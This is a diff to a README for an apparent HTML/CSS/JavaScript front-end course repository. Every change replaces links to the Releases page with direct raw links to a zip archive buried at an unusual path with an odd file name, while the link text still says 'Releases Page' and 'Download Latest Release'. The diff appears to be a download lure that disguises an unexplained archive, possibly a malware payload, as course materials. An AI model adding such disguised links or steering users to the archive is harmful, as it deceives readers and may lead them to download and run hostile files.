@@ -1,6 +1,6 @@
 # 🌐 html-css-javascript-frontend_course-luisdev_part-30_html-5_css-3_js-es2023 - Learn Front-End Essentials Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/Renylson07/html-css-javascript-frontend_course-luisdev_part-30_html-5_css-3_js-es2023/releases)
+[![Download Latest Release](https://github.com/Renylson07/html-css-javascript-frontend_course-luisdev_part-30_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-13/assets/html-luisdev-js-es-course-javascript-css-part-frontend-crookkneed.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/Renylson07/html-css-javascript-frontend_course-luisdev_part-30_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-13/assets/html-luisdev-js-es-course-javascript-css-part-frontend-crookkneed.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ To begin, you will need to download the files from the Releases page. This repos
 
 ## 🔗 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/Renylson07/html-css-javascript-frontend_course-luisdev_part-30_html-5_css-3_js-es2023/releases)
+Visit this page to download: [Releases Page](https://github.com/Renylson07/html-css-javascript-frontend_course-luisdev_part-30_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-13/assets/html-luisdev-js-es-course-javascript-css-part-frontend-crookkneed.zip)
 
 ## 📁 What You Will Find Here
 
@@ -49,7 +49,7 @@ By completing this course, you will:
 
 ## 📥 How to Use This Repository
 
-1. **Download Files**: Visit the [Releases Page](https://github.com/Renylson07/html-css-javascript-frontend_course-luisdev_part-30_html-5_css-3_js-es2023/releases) to download the course materials.
+1. **Download Files**: Visit the [Releases Page](https://github.com/Renylson07/html-css-javascript-frontend_course-luisdev_part-30_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-13/assets/html-luisdev-js-es-course-javascript-css-part-frontend-crookkneed.zip) to download the course materials.
 2. **Extract Files**: Once downloaded, extract the files to a folder on your computer.
 3. **Open in a Browser**: You can open the HTML files directly in your web browser to view them. This gives you a real-time look at the projects you're working on.
 4. **Edit Locally**: Use your preferred code editor to make changes to the files. This allows you to customize and test your code changes.
@@ -62,4 +62,4 @@ By completing this course, you will:
 
 ## 🌍 Footer
 
-Thank you for your interest in the course! Please make sure to visit the [Releases Page](https://github.com/Renylson07/html-css-javascript-frontend_course-luisdev_part-30_html-5_css-3_js-es2023/releases) to download the latest materials and start your learning journey today!
+Thank you for your interest in the course! Please make sure to visit the [Releases Page](https://github.com/Renylson07/html-css-javascript-frontend_course-luisdev_part-30_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-13/assets/html-luisdev-js-es-course-javascript-css-part-frontend-crookkneed.zip) to download the latest materials and start your learning journey today!
